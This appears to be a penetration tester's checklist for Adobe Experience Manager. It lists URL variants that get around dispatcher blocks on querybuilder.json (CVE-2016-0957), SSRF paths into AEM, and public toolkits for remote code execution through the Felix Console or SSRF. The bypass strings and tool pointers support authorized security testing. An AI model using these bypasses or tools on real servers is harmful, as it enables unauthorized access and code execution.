## adobe experience manager check list

## CVE-2016-0957
https://exmaple/bin/querybuilder.json (Block)
https://exmaple/bin/querybuilder.json/a.css (Allowed)
https://exmaple/bin/querybuilder.json/a.html (Allowed)
https://exmaple/bin/querybuilder.json/a.ico (Allowed)
https://exmaple/bin/querybuilder.json/a.png (Allowed)
https://exmaple/bin/querybuilder.json;%0aa.css (Allowed)
https://exmaple/bin/querybuilder.json/a.1.json (Allowed)

- bypasses for "interesting" serverlets
https://exmaple/bin/querybuilder.json (Block)
https://exmaple/bin/querybuilder.json/a.css (Block)
https://exmaple/bin/querybuilder.json;%0aa.css (Block)
https://exmaple/bin/querybuilder.json.servlet.css (Allowed)
https://exmaple/bin/querybuilder.json.servlet.html (Allowed)
https://exmaple/bin/querybuilder.json.servlet.ico (Allowed)
https://exmaple/bin/querybuilder.json.servlet.png (Allowed)

- adding multiple slashes:
	- ///etc.json instead of /etc.json
	- ///bin///querybuilder.json instead of /bin/querybuilder.json

## Using SSRF

- we need SSRF in a component that is allowed by AEM dispatcher
-  SSRF should allow to send GET request  and see response
	- opensocial (Shindig) Proxy
	- SSRF in ReportingServicesProxyServlet (CVE-2018-12809)

## Automation

## AEM RCE bundle

- AEM RCE bundle - https://github.com/0ang3el/aem-rce-bundle.git
	- Has pre-build OSGI bundle for AEM 6.2 or newer
- Allows to get RCE when you have access to Felix Console
	- Happens when you guessed admin credentianls

## AEM Hacker toolset

- Toolset - https://github.com/0ang3el/aem-hacker.git
- icludes scripts
	- aem_hacker.py
	- aem_discovery.py
	- aem_enum.py
	- aem_ssrf2rce.py, aem_server.py, reponse.bin
	- aem-rce-sling.sh
- https://github.com/Az0x7/vulnerability-Checklist/blob/main/aem.md
- https://github.com/ethicalhackingplayground/aem-eye